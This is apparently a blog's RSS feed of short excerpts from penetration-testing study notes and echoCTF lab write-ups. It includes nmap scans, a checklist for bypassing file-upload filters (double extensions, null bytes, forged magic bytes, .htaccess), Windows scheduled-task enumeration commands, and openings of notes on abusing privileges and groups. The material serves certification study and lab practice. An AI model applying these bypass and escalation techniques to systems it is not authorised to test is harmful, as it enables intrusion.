@@ -1,0 +1,633 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>OSCP Prep on Hacking Blog</title><link>https://hack.com.cy/categories/oscp-prep/</link><description>Recent content in OSCP Prep on Hacking Blog</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 01 Jan 2026 02:13:14 +0200</lastBuildDate><atom:link href="https://hack.com.cy/categories/oscp-prep/index.xml" rel="self" type="application/rss+xml"/><item><title>echoCTF Bart Writeup: Digest Authentication Bypass to root</title><link>https://hack.com.cy/writeups/echoctf/bart/bart/</link><pubDate>Sun, 17 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/bart/bart/</guid><description>&lt;h1 id="bart">Bart&lt;/h1>
+&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap 10.0.50.0 -A -p- -T4
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nmap-output">NMAP OUTPUT&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">8080/tcp open http-proxy
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-auth: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTP/1.1 &lt;span class="m">401&lt;/span> Unauthorized&lt;span class="se">\x&lt;/span>0D
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Digest &lt;span class="nv">algorithm&lt;/span>&lt;span class="o">=&lt;/span>MD5 &lt;span class="nv">stale&lt;/span>&lt;span class="o">=&lt;/span>FALSE &lt;span class="nv">opaque&lt;/span>&lt;span class="o">=&lt;/span>799d5 &lt;span class="nv">realm&lt;/span>&lt;span class="o">=&lt;/span>example.com &lt;span class="nv">qop&lt;/span>&lt;span class="o">=&lt;/span>auth &lt;span class="nv">domain&lt;/span>&lt;span class="o">=&lt;/span>/ &lt;span class="nv">nonce&lt;/span>&lt;span class="o">=&lt;/span>YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODA0MWYyNjo2
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> fingerprint-strings: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> FourOhFourRequest: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTP/1.0 &lt;span class="m">401&lt;/span> Unauthorized
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Vary: Accept-Encoding
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Type: text/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Content-Type-Options: nosniff
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Date: Sun, &lt;span class="m">17&lt;/span> Aug &lt;span class="m">2025&lt;/span> 12:29:48 GMT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Cache-Control: no-cache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Length: &lt;span class="m">229&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-XSS-Protection: 1&lt;span class="p">;&lt;/span> &lt;span class="nv">mode&lt;/span>&lt;span class="o">=&lt;/span>block
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connection: close
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> WWW-Authenticate: Digest &lt;span class="nv">realm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;example.com&amp;#34;&lt;/span>, &lt;span class="nv">domain&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>, &lt;span class="nv">qop&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;auth&amp;#34;&lt;/span>, &lt;span class="nv">nonce&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTMyMTo0&amp;#34;&lt;/span>, &lt;span class="nv">opaque&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;799d5&amp;#34;&lt;/span>, &lt;span class="nv">algorithm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;MD5&amp;#34;&lt;/span>, &lt;span class="nv">stale&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;FALSE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Accept-Ranges: bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;!DOCTYPE html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;title&amp;gt;Unauthorized&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;link &lt;span class="nv">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;shortcut icon&amp;#34;&lt;/span> &lt;span class="nv">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;data:image/x-icon;,&amp;#34;&lt;/span> &lt;span class="nv">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;image/x-icon&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;h2&amp;gt;Access Error: &lt;span class="m">401&lt;/span> -- Unauthorized&amp;lt;/h2&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> GetRequest: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTP/1.0 &lt;span class="m">401&lt;/span> Unauthorized
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Vary: Accept-Encoding
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Type: text/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Content-Type-Options: nosniff
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Date: Sun, &lt;span class="m">17&lt;/span> Aug &lt;span class="m">2025&lt;/span> 12:29:47 GMT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Cache-Control: no-cache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Length: &lt;span class="m">229&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-XSS-Protection: 1&lt;span class="p">;&lt;/span> &lt;span class="nv">mode&lt;/span>&lt;span class="o">=&lt;/span>block
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connection: close
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> WWW-Authenticate: Digest &lt;span class="nv">realm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;example.com&amp;#34;&lt;/span>, &lt;span class="nv">domain&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/&amp;#34;&lt;/span>, &lt;span class="nv">qop&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;auth&amp;#34;&lt;/span>, &lt;span class="nv">nonce&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;YzY0NTMwYTI4NDJmMjFhMDpleGFtcGxlLmNvbToxOThiODAxZTE4Mjoz&amp;#34;&lt;/span>, &lt;span class="nv">opaque&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;799d5&amp;#34;&lt;/span>, &lt;span class="nv">algorithm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;MD5&amp;#34;&lt;/span>, &lt;span class="nv">stale&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;FALSE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Accept-Ranges: bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;!DOCTYPE html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;title&amp;gt;Unauthorized&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;link &lt;span class="nv">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;shortcut icon&amp;#34;&lt;/span> &lt;span class="nv">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;data:image/x-icon;,&amp;#34;&lt;/span> &lt;span class="nv">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;image/x-icon&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;h2&amp;gt;Access Error: &lt;span class="m">401&lt;/span> -- Unauthorized&amp;lt;/h2&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTPOptions: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> HTTP/1.0 &lt;span class="m">405&lt;/span> Method Not Allowed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Vary: Accept-Encoding
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Frame-Options: SAMEORIGIN
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Type: text/html
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-Content-Type-Options: nosniff
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Date: Sun, &lt;span class="m">17&lt;/span> Aug &lt;span class="m">2025&lt;/span> 12:29:47 GMT
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Cache-Control: no-cache
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Content-Length: &lt;span class="m">241&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> X-XSS-Protection: 1&lt;span class="p">;&lt;/span> &lt;span class="nv">mode&lt;/span>&lt;span class="o">=&lt;/span>block
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Connection: close
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> Accept-Ranges: bytes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;!DOCTYPE html&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;title&amp;gt;Method Not Allowed&amp;lt;/title&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;link &lt;span class="nv">rel&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;shortcut icon&amp;#34;&lt;/span> &lt;span class="nv">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;data:image/x-icon;,&amp;#34;&lt;/span> &lt;span class="nv">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;image/x-icon&amp;#34;&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/head&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;h2&amp;gt;Access Error: &lt;span class="m">405&lt;/span> -- Method Not Allowed&amp;lt;/h2&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;lt;/body&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ &amp;lt;/html&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The NMAP scan found an open port on &lt;code>8080&lt;/code> and it seems that is a webserver.&lt;/p></description></item><item><title>echoCTF Barney Writeup: File Upload to root via sudo foo</title><link>https://hack.com.cy/writeups/echoctf/barney/barney/</link><pubDate>Fri, 15 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/writeups/echoctf/barney/barney/</guid><description>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;p>Start by port scanning the target machine.
+And reading the description of the box that highlight the keyword &lt;code>beer&lt;/code> and the following:
+&lt;code>Provide a steady supply of beer and you may get something more than a BURRRRRRPPPP!&lt;/code>&lt;/p>
+&lt;h2 id="nmap">NMAP&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -nvv -p- 10.0.50.0 -T4 -sC -sV
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nmap-output">NMAP Output&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">PORT STATE SERVICE REASON VERSION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">80/tcp open http syn-ack ttl &lt;span class="m">63&lt;/span> Apache httpd 2.4.38 &lt;span class="o">((&lt;/span>Debian&lt;span class="o">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> http-methods: 
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ Supported Methods: GET HEAD POST
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Found an Apache webserver version 2.4.38 running on port 80.&lt;/p></description></item><item><title>Exploting File Upload Functionality</title><link>https://hack.com.cy/notes/web/file-uploads/file-uploads/</link><pubDate>Fri, 15 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/web/file-uploads/file-uploads/</guid><description>&lt;p>Checklist:
+What framework are we traying to attack.
+Check where the validation happens (front-end or back-end).
+Can we bypass blacklist extension filters via capitalization or is there any other extension we can uplaod.
+Check for the acceptance of double extensions on uploaded files.
+Can we inject special characters (e.i, %00) null byte inejection on filename.
+Can we bypass file type restrictions by forging valid magic bytes.
+If supported by the webserver, can you upload .htaccess files&lt;/p></description></item><item><title>Abusing Schedule Tasks</title><link>https://hack.com.cy/notes/privilege-escalation/windows/tasks/tasks/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/tasks/tasks/</guid><description>&lt;h1 id="enumerating-scheduled-tasks-on-windows">Enumerating Scheduled Tasks on Windows&lt;/h1>
+&lt;h2 id="understanding-scheduled-tasks">Understanding Scheduled Tasks&lt;/h2>
+&lt;p>Scheduled tasks in Windows allow the execution of scripts, programs, or commands at specific times or events. When enumerating scheduled tasks, it is essential to consider the following:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-mysql" data-lang="mysql">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Prerequisites
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">As&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">which&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">user&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nf">account&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">principal&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">does&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">this&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">executed&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">What&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">triggers&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">specified&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">the&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">What&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">actions&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">executed&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">when&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">one&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">or&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">more&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">of&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">these&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">triggers&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">are&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">met&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="w">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="commands-for-enumerating-scheduled-tasks">Commands for Enumerating Scheduled Tasks&lt;/h2>
+&lt;h3 id="querying-scheduled-tasks">Querying Scheduled Tasks&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl"># Basic query of scheduled tasks with detailed information
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /query /fo LIST /v
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># Filter scheduled tasks by task name
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /query /fo LIST &lt;span class="mi">2&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>nul &lt;span class="p">|&lt;/span> findstr TaskName
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># Export scheduled tasks to a file and filter by specific details
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /query /fo LIST /v &lt;span class="p">&amp;gt;&lt;/span> schtasks.txt; cat schtasks.txt &lt;span class="p">|&lt;/span> findstr &lt;span class="s2">&amp;#34;SYSTEM\|Task To Run&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> findstr -B 1 SYSTEM
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"># Filter scheduled tasks by specific fields of interest
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">schtasks /query /fo LIST /v &lt;span class="p">|&lt;/span> findstr /B /C:&lt;span class="s2">&amp;#34;Folder&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;TaskName&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Run As User&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Schedule&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Scheduled Task State&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Schedule Type&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Repeat: Every&amp;#34;&lt;/span> /C:&lt;span class="s2">&amp;#34;Comment&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="using-powershell">Using PowerShell&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># List scheduled tasks excluding Microsoft default tasks&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ScheduledTask&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">where &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">TaskPath&lt;/span> &lt;span class="o">-notlike&lt;/span> &lt;span class="s2">&amp;#34;\Microsoft*&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft &lt;/span>&lt;span class="n">TaskName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">TaskPath&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">State&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="key-attributes-to-analyze">Key Attributes to Analyze&lt;/h2>
+&lt;ul>
+&lt;li>&lt;strong>Author&lt;/strong>: Who created the task?&lt;/li>
+&lt;li>&lt;strong>TaskName&lt;/strong>: The name of the scheduled task.&lt;/li>
+&lt;li>&lt;strong>Task To Run&lt;/strong>: The executable or script that the task triggers.&lt;/li>
+&lt;li>&lt;strong>Next Run Time&lt;/strong>: When the task is scheduled to run next.&lt;/li>
+&lt;/ul>
+&lt;h2 id="note">Note&lt;/h2>
+&lt;p>Once you have enumerated scheduled tasks, investigate any anomalies or tasks that execute with high privileges (e.g., SYSTEM).&lt;/p></description></item><item><title>Abusing User Privileges</title><link>https://hack.com.cy/notes/privilege-escalation/windows/user-privileges/userprivileges/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/user-privileges/userprivileges/</guid><description>&lt;h3 id="abusing-windows-user-privileges">Abusing Windows User Privileges&lt;/h3>
+&lt;p>This guide explores common Windows user privileges and their potential abuse for privilege escalation during penetration testing or CTF challenges. Each privilege is explained alongside exploitation methods and examples.&lt;/p>
+&lt;hr>
+&lt;hr>
+&lt;h2 id="seimpersonate-and-seassignprimarytoken">&lt;strong>SeImpersonate and SeAssignPrimaryToken&lt;/strong>&lt;/h2>
+&lt;p>&lt;strong>Overview&lt;/strong>: These privileges allow a user to impersonate another user or assign a primary token to a process. Commonly abused by services running under &lt;code>LOCAL SERVICE&lt;/code>, &lt;code>NETWORK SERVICE&lt;/code>, or application service accounts.&lt;/p>
+&lt;p>&lt;strong>Key Notes:&lt;/strong>&lt;/p></description></item><item><title>Abusing Windows Groups</title><link>https://hack.com.cy/notes/privilege-escalation/windows/groups/groups/</link><pubDate>Fri, 08 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/privilege-escalation/windows/groups/groups/</guid><description>&lt;h1 id="abusing-windows-group-privileges">Abusing Windows Group Privileges&lt;/h1>
+&lt;p>Understanding and leveraging Windows group privileges is a critical aspect of system security and penetration testing. This guide delves into the capabilities and potential abuse of several key Windows groups, including their privileges and methods of exploitation.&lt;/p>
+&lt;hr>
+&lt;hr>
+&lt;h2 id="-windows-built-in-groups-">** Windows Built-in Groups **&lt;/h2>
+&lt;p>&lt;strong>Overview&lt;/strong>: Windows built-in groups come with predefined privileges. A detailed list of these groups and their functionalities is available:&lt;/p>
+&lt;ul>
+&lt;li>&lt;a href="https://ss64.com/nt/syntax-security_groups.html">Windows Built-in Groups&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory">Privileged Accounts and Groups in Active Directory&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;hr>
+&lt;h1 id="backup-operators">Backup Operators&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List our current group membership&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">whoami&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">groups&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Assuming we are in the `Backup Operators` group&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Memebers of this group grant the following privilages:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">-&lt;/span> &lt;span class="n">SeBckup&lt;/span>
